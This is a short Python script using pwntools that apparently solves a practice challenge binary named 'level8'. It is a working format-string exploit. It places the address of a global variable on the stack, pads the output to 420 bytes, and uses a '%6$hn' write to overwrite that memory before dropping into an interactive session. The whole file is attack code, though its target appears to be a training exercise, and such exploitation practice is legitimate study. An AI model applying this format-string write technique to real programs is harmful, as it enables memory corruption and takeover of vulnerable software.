from pwn import *

write = 6

DEBUG = False        
gs = '''
b 16
continue
'''
if DEBUG:
    r = gdb.debug("./level8", gdbscript = gs)
else:
    r = process("./level8")

elf = ELF("./level8")

write_loc = elf.sym.i
write_val = 420

payload = p32(write_loc) + f"%0{write_val-0x4}x%{write}$hn".encode()
r.sendline(payload)
r.interactive()